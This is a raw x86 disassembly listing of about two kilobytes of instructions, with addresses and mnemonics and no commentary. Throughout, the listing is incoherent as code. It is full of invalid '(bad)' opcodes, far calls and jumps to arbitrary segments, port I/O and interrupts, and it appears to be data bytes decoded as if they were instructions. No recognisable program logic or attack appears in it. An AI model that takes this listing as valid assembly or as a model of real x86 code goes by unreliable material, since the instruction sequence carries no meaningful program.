  4068d3:	sbb    bl,BYTE PTR [ebx+0x9990e98]
  4068d9:	xchg   esi,eax
  4068da:	dec    edi
  4068db:	push   es
  4068dc:	mov    ebx,0xed591a0f
  4068e1:	mov    WORD PTR [edx+ebx*8+0x15],?
  4068e5:	aam    0x5
  4068e7:	addr16 mov eax,0xa76786d3
  4068ed:	mov    dl,0x33
  4068ef:	mov    ebx,0xe5807532
  4068f4:	nop
  4068f5:	inc    ebx
  4068f6:	cs push ecx
  4068f8:	mov    dl,0xe
  4068fa:	call   0xbac:0xa761f4bd
  406901:	jmp    0xe137fd3b
  406906:	jbe    0x4068d8
  406908:	popw   ds
  40690a:	dec    esi
  40690b:	ficomp DWORD PTR [ebx+ebx*4+0x20bba6e1]
  406912:	mov    edx,0xc3aaf053
  406917:	xchg   DWORD PTR [edx-0x50],ebx
  40691a:	pop    edx
  40691b:	mov    ebx,DWORD PTR [eax]
  40691d:	rcl    ebx,1
  40691f:	jge    0x406902
  406921:	mov    ds:0xd4c92ab3,al
  406926:	mov    ds:0x2e1fbbba,eax
  40692b:	fsub   st,st(0)
  40692d:	and    BYTE PTR [ebx-0x46],bh
  406930:	mov    esi,0xf728f6
  406935:	mov    eax,ds:0x80461960
  40693a:	fnstsw ax
  40693c:	push   ds
  40693d:	aad    0x95
  40693f:	mov    edx,0xd421ee68
  406944:	fisttp DWORD PTR [edx]
  406946:	cmp    al,0x20
  406948:	loopne 0x40699a
  40694a:	sub    DWORD PTR [edi-0x23],ecx
  40694d:	xlat   BYTE PTR ds:[ebx]
  40694e:	fstp   TBYTE PTR [ebp*4+0x5c03b478]
  406955:	test   eax,0xaf6e7308
  40695a:	ja     0x406984
  40695c:	xchg   ebx,eax
  40695d:	je     0x4068fb
  40695f:	pushf  
  406960:	int    0x2a
  406962:	xor    DWORD PTR [edx+0x2fe9b30a],eax
  406968:	and    ah,BYTE PTR [edx+0x2a473e8c]
  40696e:	sahf   
  40696f:	mov    bl,BYTE PTR cs:[eax+esi*1+0x4f]
  406974:	arpl   si,sp
  406976:	js     0x406945
  406978:	inc    esi
  406979:	into   
  40697a:	xor    dh,BYTE PTR [ebx-0x69584d15]
  406980:	lahf   
  406981:	push   ebp
  406982:	cli    
  406983:	xchg   edx,ebp
  406985:	scas   eax,DWORD PTR es:[edi]
  406986:	out    0x91,eax
  406988:	or     BYTE PTR [ebp-0xbdd8d5],dl
  40698e:	imul   ebx,DWORD PTR [ebp+0x6cdb82b5],0x34
  406995:	sbb    BYTE PTR [ecx],dl
  406997:	sbb    DWORD PTR [edi-0x8],0xffffffc1
  40699b:	xchg   esp,eax
  40699c:	ins    DWORD PTR es:[edi],dx
  40699d:	enter  0x4996,0xfa
  4069a1:	stc    
  4069a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069a3:	xchg   ecx,eax
  4069a4:	dec    ebx
  4069a5:	ins    BYTE PTR es:[edi],dx
  4069a6:	or     eax,0x39467d40
  4069ab:	pop    esi
  4069ac:	es jns 0x406934
  4069af:	fdivr  st,st(1)
  4069b1:	cdq    
  4069b2:	into   
  4069b3:	call   0xa96a:0x56576eef
  4069ba:	dec    ecx
  4069bb:	mov    eax,0xbc01eb6f
  4069c0:	jo     0x406a12
  4069c2:	enter  0x40b6,0xec
  4069c6:	sub    al,0x28
  4069c8:	adc    al,0xcd
  4069ca:	pop    ds
  4069cb:	js     0x40697b
  4069cd:	(bad)  
  4069ce:	pop    ecx
  4069cf:	loope  0x4069af
  4069d1:	push   0x75
  4069d3:	sub    dl,BYTE PTR [eax]
  4069d5:	ins    DWORD PTR es:[edi],dx
  4069d6:	mov    al,ds:0x1c16e954
  4069db:	pop    esi
  4069dc:	dec    DWORD PTR [esp+esi*2-0x15bf0aad]
  4069e3:	fimul  WORD PTR [ebx]
  4069e5:	rcr    DWORD PTR [bp+di-0x6ac1],0x1b
  4069eb:	or     al,al
  4069ed:	mov    eax,0xbe7a2d11
  4069f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069f3:	mov    ch,0x5f
  4069f5:	stc    
  4069f6:	add    BYTE PTR [eax+eax*4],0x82
  4069fa:	dec    eax
  4069fb:	sbb    esp,DWORD PTR [edi-0x6e]
  4069fe:	adc    eax,0x9b24aaab
  406a03:	xor    eax,0x17b206b4
  406a08:	adc    eax,0x7942c6e2
  406a0d:	enter  0x2d15,0x7e
  406a11:	cmp    edx,edi
  406a13:	or     bl,cl
  406a15:	mov    ds:0x38edb57c,eax
  406a1a:	add    al,0x63
  406a1c:	sbb    bh,bl
  406a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a1f:	adc    DWORD PTR [edi],ecx
  406a21:	mov    ss,WORD PTR [ecx+0x17]
  406a24:	add    ecx,ecx
  406a26:	pop    ecx
  406a27:	adc    BYTE PTR [eax],dl
  406a29:	xchg   ecx,eax
  406a2a:	sub    bh,BYTE PTR [ebp+0x43d48c03]
  406a30:	adc    bh,BYTE PTR [ebp-0x4e]
  406a33:	ret    
  406a34:	or     ebp,DWORD PTR [ebp+0x16593d21]
  406a3a:	mov    cl,0x49
  406a3c:	mov    bl,BYTE PTR [edx]
  406a3e:	je     0x406a7f
  406a40:	xor    eax,0xaf0d1b
  406a45:	out    0x8c,eax
  406a47:	test   eax,0x7f5f599e
  406a4c:	vaddss xmm1,xmm7,DWORD PTR [ebx-0x2ebd5c92]
  406a54:	sbb    eax,0x23a891fc
  406a59:	loope  0x406a54
  406a5b:	ror    BYTE PTR [ecx+0x47],cl
  406a5e:	and    al,0x98
  406a60:	or     BYTE PTR [eax-0x1c2854b9],dh
  406a66:	icebp  
  406a67:	inc    ebx
  406a68:	push   0x65
  406a6a:	and    ah,BYTE PTR [edx]
  406a6c:	idiv   BYTE PTR [ecx+eax*4]
  406a6f:	pop    ecx
  406a70:	out    dx,eax
  406a71:	adc    ah,dl
  406a73:	arpl   WORD PTR [ecx],bx
  406a75:	lds    ebp,FWORD PTR [esi+ebp*1-0x73]
  406a79:	mov    ebx,0xf3f0f156
  406a7e:	cmp    DWORD PTR [ebx+0x3f974c2a],ebp
  406a84:	scas   eax,DWORD PTR es:[edi]
  406a85:	cmp    eax,0xf9476dfd
  406a8a:	std    
  406a8b:	add    eax,0x6094e01e
  406a90:	and    DWORD PTR [eax+0x4],ebp
  406a93:	(bad)  
  406a94:	fild   WORD PTR [eax+ebp*2+0x1f]
  406a98:	lock shr bl,1
  406a9b:	rcr    BYTE PTR [ecx-0x4b],cl
  406a9e:	push   edi
  406a9f:	push   0x33147b84
  406aa4:	push   edx
  406aa5:	xchg   BYTE PTR [ecx-0x5127abaa],bl
  406aab:	ror    DWORD PTR [edx+0x79],cl
  406aae:	mov    esi,0x5529832b
  406ab3:	adc    eax,0x7630d81b
  406ab8:	cs dec ebx
  406aba:	push   0x2c960809
  406abf:	sub    al,cl
  406ac1:	lock pop edx
  406ac3:	sbb    ecx,DWORD PTR [edi+0x248c6109]
  406ac9:	add    eax,0xb8a9ac61
  406ace:	aaa    
  406acf:	mov    ebp,0x27c15173
  406ad4:	jge    0x406a8d
  406ad6:	dec    ebx
  406ad7:	mov    DWORD PTR [edi+ecx*4-0xb],ebx
  406adb:	pop    ebx
  406adc:	pop    ss
  406add:	cs push esp
  406adf:	daa    
  406ae0:	mov    al,dl
  406ae2:	dec    esp
  406ae3:	call   0xc4e0:0x9dc1dc50
  406aea:	inc    edi
  406aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aec:	push   0xf76b89fc
  406af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406af2:	(bad)  
  406af3:	mov    esi,0x859dbaa3
  406af8:	pop    edx
  406af9:	jmp    0x1293:0xe808597
  406b00:	fimul  DWORD PTR [ecx+eiz*8+0x13eb47e0]
  406b07:	jo     0x406ab4
  406b09:	lea    esi,[eax+ebx*8-0x41f2f8a]
  406b10:	cld    
  406b11:	pop    edi
  406b12:	mov    WORD PTR [eax],ds
  406b14:	xchg   ebx,eax
  406b15:	cmp    BYTE PTR [ebx-0x23],dl
  406b18:	cwde   
  406b19:	jg     0x406afc
  406b1b:	outs   dx,DWORD PTR ds:[esi]
  406b1c:	ja     0x406b03
  406b1e:	out    0xd0,al
  406b20:	cli    
  406b21:	aam    0x9b
  406b23:	fst    st(3)
  406b25:	fcmovnb st,st(1)
  406b27:	or     BYTE PTR [ecx],0x78
  406b2a:	push   cs
  406b2b:	xchg   DWORD PTR [ecx+0x1d1f48ee],ebp
  406b31:	clc    
  406b32:	inc    eax
  406b33:	cdq    
  406b34:	bound  edx,QWORD PTR [eax+0x92c00e9]
  406b3a:	and    edi,edi
  406b3c:	int    0x1e
  406b3e:	mov    dh,0x3f
  406b40:	enter  0x250a,0xb7
  406b44:	(bad)  
  406b45:	fstp   QWORD PTR [ecx-0x22]
  406b48:	jl     0x406afb
  406b4a:	adc    al,0x92
  406b4c:	add    DWORD PTR [esi+0x70],0x32
  406b50:	not    DWORD PTR [esi-0x2]
  406b53:	push   0xc5b80320
  406b58:	xchg   ecx,eax
  406b59:	mov    WORD PTR [edi-0x4e17787f],ds
  406b5f:	and    al,0x10
  406b61:	and    edx,ebx
  406b63:	and    ch,BYTE PTR [edx]
  406b65:	idiv   eax
  406b67:	adc    DWORD PTR [ebx+0x624f0843],ebp
  406b6d:	jg     0x406b3f
  406b6f:	sub    esp,DWORD PTR [ebx+ebx*2+0x43881cad]
  406b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b77:	mov    ah,0x87
  406b79:	stos   BYTE PTR es:[edi],al
  406b7a:	lahf   
  406b7b:	out    0xbe,al
  406b7d:	jne    0x406b43
  406b7f:	or     BYTE PTR [ebx-0x64],bh
  406b82:	fnstcw WORD PTR fs:[eax+0x93c2527]
  406b89:	out    dx,eax
  406b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b8b:	sar    DWORD PTR [eax],cl
  406b8d:	pop    esp
  406b8e:	gs cmp al,0xd4
  406b91:	sub    bh,BYTE PTR ds:0xc0778eda
  406b97:	push   0x51d3c07b
  406b9c:	push   es
  406b9d:	shl    BYTE PTR [ecx],0xda
  406ba0:	add    DWORD PTR [edi],edi
  406ba2:	push   ds
  406ba3:	rcr    BYTE PTR [edi+0x2a5a9875],1
  406ba9:	pop    ecx
  406baa:	push   0x56de3f15
  406baf:	mov    eax,ds:0x5cf2cd73
  406bb4:	mov    al,ds:0x3257179a
  406bb9:	iret   
  406bba:	lods   eax,DWORD PTR ds:[esi]
  406bbb:	jb     0x406c06
  406bbd:	mov    edx,0x5641de62
  406bc2:	xchg   ebp,eax
  406bc3:	data16 xor al,0xc3
  406bc6:	ins    BYTE PTR es:[edi],dx
  406bc7:	sbb    ecx,DWORD PTR [esi-0x37]
  406bca:	cmc    
  406bcb:	ds and eax,0x4a307578
  406bd1:	out    dx,al
  406bd2:	lds    esp,FWORD PTR [ebx-0x3d]
  406bd5:	inc    eax
  406bd6:	pushf  
  406bd7:	lods   eax,DWORD PTR ds:[esi]
  406bd8:	test   eax,0xd4ddf763
  406bdd:	fidiv  DWORD PTR [ebx+ecx*2+0x7fbc6286]
  406be4:	aad    0x1b
  406be6:	jb     0x406b8e
  406be8:	jg     0x406c37
  406bea:	cs (bad) 
  406bec:	fcom   DWORD PTR [edx-0x10a3f131]
  406bf2:	ins    BYTE PTR es:[edi],dx
  406bf3:	sub    cl,BYTE PTR [edx-0x687cb11]
  406bf9:	in     al,0x8e
  406bfb:	jbe    0x406bfb
  406bfd:	lahf   
  406bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bff:	xlat   BYTE PTR ds:[ebx]
  406c00:	in     eax,0xd5
  406c02:	test   BYTE PTR [eax-0x19d11caa],0xac
  406c09:	call   0x9e:0x9ef8aae0
  406c10:	inc    ecx
  406c11:	push   edx
  406c12:	test   al,0xdf
  406c14:	in     eax,0x90
  406c16:	jge    0x406c95
  406c18:	add    bh,BYTE PTR cs:[esi]
  406c1b:	fidivr WORD PTR [ebx-0x13]
  406c1e:	dec    eax
  406c1f:	in     eax,dx
  406c20:	pop    edx
  406c21:	pop    esi
  406c22:	mov    ecx,0x9ca03963
  406c27:	arpl   WORD PTR [edi],dx
  406c29:	ucomiss xmm3,DWORD PTR [edx+0x16]
  406c2d:	pop    esi
  406c2e:	lods   eax,DWORD PTR es:[esi]
  406c30:	xor    dh,BYTE PTR [edi-0x17]
  406c33:	fwait
  406c34:	add    al,0xeb
  406c36:	cs xchg ecx,eax
  406c38:	and    ch,al
  406c3a:	xor    al,0x50
  406c3c:	cmp    eax,DWORD PTR [ecx+eax*8-0x58fb68eb]
  406c43:	call   DWORD PTR [ebx-0x6987c229]
  406c49:	sub    al,BYTE PTR ds:0x3e00344d
  406c4f:	sub    cl,BYTE PTR [ebx+0x4ae83e52]
  406c55:	rcl    BYTE PTR [ebx-0x60],1
  406c58:	or     eax,0xd3ce4f6c
  406c5d:	retf   
  406c5e:	pop    ebx
  406c5f:	rcl    DWORD PTR [eax+ebx*8],cl
  406c62:	jl     0x406cc5
  406c64:	mov    bh,0xd7
  406c66:	in     eax,0xf
  406c68:	ror    eax,cl
  406c6a:	mov    ecx,0x1249350f
  406c6f:	fisttp QWORD PTR [ebx]
  406c71:	dec    esp
  406c72:	loope  0x406bfe
  406c74:	push   0x51
  406c76:	push   edi
  406c77:	inc    ecx
  406c78:	jle    0x406c30
  406c7a:	sbb    bl,bh
  406c7c:	mov    esp,0x4a742f0d
  406c81:	das    
  406c82:	add    ch,BYTE PTR [ebx+0x8]
  406c85:	sahf   
  406c86:	mov    esi,0xdc753f3b
  406c8b:	fsub   QWORD PTR [edx]
  406c8d:	jmp    0xabff044
  406c92:	xor    ebp,DWORD PTR [ebp-0x14d2b34b]
  406c98:	std    
  406c99:	ss push cs
  406c9b:	cmc    
  406c9c:	das    
  406c9d:	xchg   ecx,eax
  406c9e:	xor    bh,BYTE PTR [esi-0x43]
  406ca1:	dec    edx
  406ca2:	aad    0x19
  406ca4:	retf   
  406ca5:	push   edx
  406ca6:	ds sbb al,0xa
  406ca9:	stc    
  406caa:	dec    ecx
  406cab:	or     BYTE PTR [edi],dh
  406cad:	shr    DWORD PTR fs:[edi+edx*1+0x7fdf85],cl
  406cb5:	add    eax,0xdc82bf50
  406cba:	and    al,0xff
  406cbc:	jbe    0x406cb2
  406cbe:	cmp    esp,ebp
  406cc0:	fild   QWORD PTR [edx-0x4a]
  406cc3:	out    0x13,al
  406cc5:	sahf   
  406cc6:	rcl    BYTE PTR [edx-0x30],cl
  406cc9:	cmp    al,0xaf
  406ccb:	fs and eax,0x8a9742cd
  406cd1:	std    
  406cd2:	jae    0x406d3c
  406cd4:	xor    BYTE PTR [edx+0xabcfb5],0xb2
  406cdb:	ins    BYTE PTR es:[edi],dx
  406cdc:	fisub  WORD PTR [ebx-0x231e81e2]
  406ce2:	retf   
  406ce3:	xor    dh,al
  406ce5:	and    eax,0xdc8f11d7
  406cea:	test   al,0xcf
  406cec:	ror    dh,1
  406cee:	push   ebx
  406cef:	cli    
  406cf0:	cmovae edx,DWORD PTR [ebx+0x7f]
  406cf4:	pop    ebx
  406cf5:	into   
  406cf6:	or     BYTE PTR [edi+0x726e6bcc],ch
  406cfc:	mov    ds:0xd9dbe4e0,al
  406d01:	mov    bl,0x3
  406d03:	dec    edx
  406d04:	call   0x15848222
  406d09:	lds    edi,FWORD PTR [edi+0x6e]
  406d0c:	jl     0x406cb7
  406d0e:	xchg   DWORD PTR [esi+0x3b075d41],eax
  406d14:	cld    
  406d15:	xor    esi,esp
  406d17:	stos   BYTE PTR es:[edi],al
  406d18:	cmp    DWORD PTR [edi-0x2ef3316],ebp
  406d1e:	mov    ah,0xa4
  406d20:	stc    
  406d21:	xor    bl,dh
  406d23:	or     BYTE PTR [esi+edx*2-0x33],ah
  406d27:	jmp    0xe98a:0x12f8222b
  406d2e:	rol    DWORD PTR ds:0x24dd79aa,cl
  406d34:	popa   
  406d35:	std    
  406d36:	mov    eax,ds:0xe0b4f2ad
  406d3b:	mov    dl,0xd6
  406d3d:	or     eax,DWORD PTR [ecx-0x737e102a]
  406d43:	adc    ch,BYTE PTR [esp+edx*1+0x5f]
  406d47:	jno    0x406d15
  406d49:	mov    BYTE PTR [eax-0x50],cl
  406d4c:	push   esp
  406d4d:	ins    DWORD PTR es:[edi],dx
  406d4e:	in     al,0xa7
  406d50:	mov    ch,0xdb
  406d52:	fnstenv [eax-0xa843c56]
  406d58:	push   es
  406d59:	jns    0x406dcf
  406d5b:	sub    eax,0x684ec113
  406d60:	dec    edi
  406d61:	in     al,0x5a
  406d63:	mov    dl,0xcc
  406d65:	enter  0x5c52,0x31
  406d69:	add    ecx,ebx
  406d6b:	dec    eax
  406d6c:	push   edi
  406d6d:	test   eax,0xbef4fd84
  406d72:	into   
  406d73:	push   ebx
  406d74:	sahf   
  406d75:	hlt    
  406d76:	mov    edx,0xffc2c5a3
  406d7b:	xchg   edx,eax
  406d7c:	test   eax,0x68ae1ed7
  406d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d82:	int    0xe
  406d84:	pop    ss
  406d85:	cwde   
  406d86:	or     eax,0x12a035e2
  406d8b:	test   DWORD PTR [edi],eax
  406d8d:	ret    0x3c58
  406d90:	pop    ebp
  406d91:	jo     0x406d55
  406d93:	pushf  
  406d94:	mov    esi,0x9d9b1bde
  406d99:	adc    dh,dh
  406d9b:	aad    0x7d
  406d9d:	jle    0x406d45
  406d9f:	cld    
  406da0:	cmp    eax,0x2e7f23f9
  406da5:	bound  ecx,QWORD PTR [ecx+0x25935808]
  406dab:	dec    edi
  406dac:	shl    BYTE PTR [eax-0x3d],0x4e
  406db0:	jne    0x406d3b
  406db2:	adc    DWORD PTR [eax-0x7820b4f6],ebp
  406db8:	inc    edi
  406db9:	mov    ebx,0xbacb6f5
  406dbe:	xrelease xchg BYTE PTR [ebp-0x4e227608],ah
  406dc5:	add    BYTE PTR [ebx],0x65
  406dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dc9:	loop   0x406e14
  406dcb:	stc    
  406dcc:	into   
  406dcd:	loopne 0x406db5
  406dcf:	cmp    ecx,DWORD PTR [edi]
  406dd1:	mov    ebp,edx
  406dd3:	in     al,0x88
  406dd5:	jmp    DWORD PTR [ebx+eiz*4+0x46]
  406dd9:	cld    
  406dda:	out    dx,al
  406ddb:	(bad)  
  406ddd:	ficom  DWORD PTR [ecx-0x4d5ba956]
  406de3:	js     0x406e52
  406de5:	mov    DWORD PTR [esi],esp
  406de7:	xchg   BYTE PTR [edi],al
  406de9:	mov    ebp,0xfbb9c50e
  406dee:	mov    ds:0x1ef5cc68,al
  406df3:	imul   DWORD PTR [esp+0xcf77ff2]
  406dfa:	mov    ?,WORD PTR [ebx-0x60]
  406dfd:	ss (bad) 
  406dff:	sub    BYTE PTR [edi],ch
  406e01:	adc    edx,DWORD PTR [eax+ebp*8-0x4d6f1e48]
  406e08:	call   0xbce0:0x2fff0eab
  406e0f:	dec    ebx
  406e10:	and    DWORD PTR [ebx-0x6a5347f7],0x5cd5cb9d
  406e1a:	inc    esp
  406e1b:	call   0xd75c:0xf8b5ddab
  406e22:	xor    ecx,ebp
  406e24:	push   cs
  406e25:	mov    ebx,0xc27ae41
  406e2a:	(bad)  
  406e2c:	imul   ebp,DWORD PTR [ebp+0x58e99fe9],0x1d
  406e33:	mov    dh,0x6c
  406e35:	cmp    DWORD PTR [edi+0x21],eax
  406e38:	mov    ebp,0x2753cb56
  406e3d:	(bad)  
  406e3e:	push   ebp
  406e3f:	cmp    al,0xc6
  406e41:	shr    DWORD PTR [eax+0x7d],1
  406e44:	int3   
  406e45:	call   0x1e5c:0x81cdf11e
  406e4c:	sbb    BYTE PTR [edi-0x16e09060],cl
  406e52:	and    BYTE PTR [eax+0x5b],dh
  406e55:	dec    eax
  406e56:	sub    bh,BYTE PTR [eax+0x2d]
  406e59:	xor    edi,ecx
  406e5b:	jae    0x406ebe
  406e5d:	test   eax,0xaf88740a
  406e62:	xor    DWORD PTR [eax+0x6d],ebx
  406e65:	and    esi,DWORD PTR [edi]
  406e67:	fwait
  406e68:	jb     0x406e52
  406e6a:	push   edi
  406e6b:	cli    
  406e6c:	sbb    ah,BYTE PTR [eax+esi*4-0x4a]
  406e70:	sub    eax,DWORD PTR [ecx]
  406e72:	pusha  
  406e73:	jbe    0x406dff
  406e75:	loope  0x406e12
  406e77:	outs   dx,DWORD PTR ds:[esi]
  406e78:	inc    ebx
  406e79:	dec    ebx
  406e7a:	add    BYTE PTR [ebx],cl
  406e7c:	pop    eax
  406e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e7e:	mov    esp,0x2c62618e
  406e83:	dec    edx
  406e84:	out    dx,al
  406e85:	out    0xd4,al
  406e87:	dec    esi
  406e88:	lods   al,BYTE PTR ds:[esi]
  406e89:	ret    0xf494
  406e8c:	js     0x406e49
  406e8e:	xor    DWORD PTR [edi],0x1a
  406e91:	sbb    eax,DWORD PTR [esi+ebx*8-0x73]
  406e95:	or     DWORD PTR [edi-0x971b25],esp
  406e9b:	loope  0x406eb4
  406e9d:	imul   esp,edi,0x1e
  406ea0:	icebp  
  406ea1:	push   edx
  406ea2:	scas   eax,DWORD PTR es:[edi]
  406ea3:	cmp    BYTE PTR ds:0x7b015161,0x88
  406eaa:	mov    bl,BYTE PTR [edx]
  406eac:	sbb    al,0xd2
  406eae:	jmp    0x406eaf
  406eb0:	jmp    0x406f1c
  406eb2:	cmp    dl,dh
  406eb4:	xlat   BYTE PTR ds:[ebx]
  406eb5:	mul    esi
  406eb7:	iret   
  406eb8:	mov    esp,0xc67d3257
  406ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ebe:	or     al,0xd1
  406ec0:	lods   eax,DWORD PTR ds:[esi]
  406ec1:	inc    edx
  406ec2:	or     eax,0x1788cae0
  406ec7:	loope  0x406ead
  406ec9:	test   al,0xb9
  406ecb:	mov    cl,0x39
  406ecd:	push   cs
  406ece:	pop    edi
  406ecf:	cmp    al,0xad
  406ed1:	dec    ebp
  406ed2:	enter  0x231b,0xba
  406ed6:	in     al,dx
  406ed7:	sti    
  406ed8:	imul   edi,DWORD PTR [ecx+0xc3a0669],0xffffffff
  406edf:	dec    ebp
  406ee0:	inc    ebx
  406ee1:	jmp    0x6856:0x50052ab6
  406ee8:	not    DWORD PTR [edi]
  406eea:	popa   
  406eeb:	add    eax,0xea0d192b
  406ef0:	jl     0x406e95
  406ef2:	xchg   esp,eax
  406ef3:	rcl    edi,0x65
  406ef6:	adc    BYTE PTR [esi+0x0],0xdb
  406efa:	xchg   ebx,eax
  406efb:	and    al,cl
  406efd:	leave  
  406efe:	jns    0x406ea9
  406f00:	pop    eax
  406f01:	sahf   
  406f02:	push   ebp
  406f03:	jg     0x406f05
  406f05:	imul   esi,DWORD PTR [esi-0x1cc1fe9a],0x23a83313
  406f0f:	cli    
  406f10:	stos   DWORD PTR es:[edi],eax
  406f11:	or     dh,ah
  406f13:	mov    dh,0x5f
  406f15:	mov    esp,0x1570b66d
  406f1a:	ins    DWORD PTR es:[edi],dx
  406f1b:	inc    ecx
  406f1c:	stos   DWORD PTR es:[edi],eax
  406f1d:	loope  0x406f17
  406f1f:	sub    eax,DWORD PTR [eax+0x3be33fcf]
  406f25:	std    
  406f26:	test   al,0xbd
  406f28:	jns    0x406f09
  406f2a:	mov    ds:0x18dd6aa6,al
  406f2f:	iret   
  406f30:	mov    dl,0x58
  406f32:	int    0xd
  406f34:	pushf  
  406f35:	ins    DWORD PTR es:[edi],dx
  406f36:	mov    ch,0x82
  406f38:	cli    
  406f39:	lea    ebp,[esi]
  406f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f3c:	xor    ecx,DWORD PTR [ebx]
  406f3e:	cmp    edx,edx
  406f40:	add    eax,DWORD PTR [esi-0x2d2a088]
  406f46:	sub    eax,0x217fb292
  406f4b:	shl    ch,1
  406f4d:	jecxz  0x406ee9
  406f4f:	sar    ebx,cl
  406f51:	sub    BYTE PTR [eax-0x12],0xd4
  406f55:	sbb    eax,0x47c2cc89
  406f5a:	leave  
  406f5b:	push   cs
  406f5c:	dec    edx
  406f5d:	(bad)  [esi+esi*1+0x3e31defa]
  406f64:	ja     0x406f37
  406f66:	loopne 0x406f83
  406f68:	push   ss
  406f69:	or     DWORD PTR [ecx+0x3531e5a6],ecx
  406f6f:	pop    ds
  406f70:	sub    eax,0x49c281cb
  406f75:	xor    ah,bh
  406f77:	shl    esi,0x7f
  406f7a:	mov    dl,0xf6
  406f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f7d:	sbb    al,0x17
  406f7f:	jmp    0x406fda
  406f81:	cmp    ecx,DWORD PTR [ebp+0x1]
  406f84:	dec    esi
  406f85:	shl    edx,0xd3
  406f88:	xchg   edi,eax
  406f89:	mov    esp,0x37813da0
  406f8e:	adc    esp,DWORD PTR [ebx]
  406f90:	cli    
  406f91:	in     eax,dx
  406f92:	loop   0x406f6a
  406f94:	dec    edx
  406f95:	ret    
  406f96:	jbe    0x406ffd
  406f98:	daa    
  406f99:	sub    dl,BYTE PTR [edi-0x4a]
  406f9c:	sbb    BYTE PTR [ebx],al
  406f9e:	gs (bad) 
  406fa1:	xchg   cx,ax
  406fa3:	ror    BYTE PTR [ecx-0x7e],1
  406fa6:	loopne 0x406f62
  406fa8:	sub    BYTE PTR [ebx-0x3c],ch
  406fab:	sub    DWORD PTR [edi],ebp
  406fad:	push   edx
  406fae:	shl    DWORD PTR [edi+0x7a7343d0],cl
  406fb4:	in     eax,0xa5
  406fb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fb7:	shl    DWORD PTR [edx-0x7b399256],0x5e
  406fbe:	sub    al,BYTE PTR [ebp-0x24]
  406fc1:	and    BYTE PTR [esi+ebp*8],bl
  406fc4:	cmp    ch,bh
  406fc6:	in     eax,0x2b
  406fc8:	sti    
  406fc9:	adc    DWORD PTR [edx-0x7e10a969],esp
  406fcf:	test   al,0x35
  406fd1:	test   eax,0x629fdfc4
  406fd6:	sbb    al,0x3b
  406fd8:	sub    al,0xd3
  406fda:	add    dl,BYTE PTR [esi-0x3e632a4e]
  406fe0:	lahf   
  406fe1:	jge    0x407015
  406fe3:	mov    ah,cl
  406fe5:	scas   al,BYTE PTR es:[edi]
  406fe6:	sbb    ebx,edx
  406fe8:	jp     0x407045
  406fea:	out    0x34,al
  406fec:	sub    eax,0xeeadd901
  406ff1:	xchg   esp,eax
  406ff2:	adc    DWORD PTR ds:0xa9d03cfc,esp
  406ff8:	(bad)  
  406ff9:	cmp    ah,BYTE PTR [ebp+0x76]
  406ffc:	shl    DWORD PTR [esi+edi*8],0xe8
  407000:	and    dl,BYTE PTR [esi+0x1a919353]
  407006:	test   DWORD PTR [ebp+0x4],edi
  407009:	inc    esi
  40700a:	inc    eax
  40700b:	cmp    DWORD PTR [ebx-0x25],edx
  40700e:	inc    ecx
  40700f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407010:	inc    esp
  407011:	xor    BYTE PTR [esi+0x180ef539],bh
  407017:	push   ebx
  407018:	test   BYTE PTR [eax],bl
  40701a:	psubsw mm2,QWORD PTR [ebp-0x39]
  40701e:	lahf   
  40701f:	or     DWORD PTR [eax+0x47],eax
  407022:	inc    esi
  407023:	add    DWORD PTR [ebx+edi*4+0x31],ecx
  407027:	dec    edi
  407028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407029:	and    eax,0xa7d79d62
  40702e:	inc    eax
  40702f:	loop   0x406fb7
  407031:	sahf   
  407032:	or     ebp,DWORD PTR [ebp-0x5282a90f]
  407038:	test   edx,ecx
  40703a:	hlt    
  40703b:	mov    ?,WORD PTR [ebx+edx*1+0x5faa8b69]
  407042:	xchg   ecx,eax
  407043:	fbld   TBYTE PTR [esi-0xc]
  407046:	enter  0xe71,0xce
  40704a:	es xchg ebx,eax
  40704c:	inc    esi
  40704d:	jns    0x40709b
  40704f:	xchg   ecx,eax
  407050:	fmul   QWORD PTR [esi]
  407052:	add    al,0xfd
  407054:	and    edi,0xbfc9eb0d
  40705a:	add    eax,0xe2805ea6
  40705f:	(bad)  
  407060:	mov    dl,0x4c
  407062:	loop   0x4070d0
  407064:	jmp    0x407092
  407066:	mov    DWORD PTR [edi+0x18d07b3f],0xaec29ab1
  407070:	std    
  407071:	mov    cl,0xfe
  407073:	pop    esi
  407074:	arpl   WORD PTR [edx],dx
  407076:	es aas 
  407078:	js     0x40703d
  40707a:	pushf  
  40707b:	sahf   
  40707c:	loope  0x40701e
  40707e:	xor    DWORD PTR [ebx+0x2b],esp
  407081:	leave  
  407082:	xchg   esi,eax
  407083:	add    al,0x74
  407085:	inc    esp
  407086:	pop    eax
  407087:	mov    ecx,0xdd24d426
  40708c:	xchg   ebx,eax
  40708d:	lahf   
  40708e:	push   ss
  40708f:	lahf   
  407090:	lock and al,0x8f
  407093:	cmp    DWORD PTR [ecx+0x6fce027d],ebp
  407099:	(bad)  
  40709a:	ficomp WORD PTR [edi]
  40709c:	sbb    edi,DWORD PTR [ebp+0x4fb9e4cd]
  4070a2:	pop    ss
  4070a3:	mov    bh,0xb6
  4070a5:	(bad)  
  4070a6:	int    0xcb
  4070a8:	jmp    0xfaeb:0x184fad98
  4070af:	imul   esi,DWORD PTR [esi],0xffffffe8
  4070b2:	fwait
  4070b3:	data16 xor bl,ch
  4070b6:	and    DWORD PTR [ecx],ebp
  4070b8:	cmp    al,0x7d
  4070ba:	cs sahf 
  4070bc:	pop    es
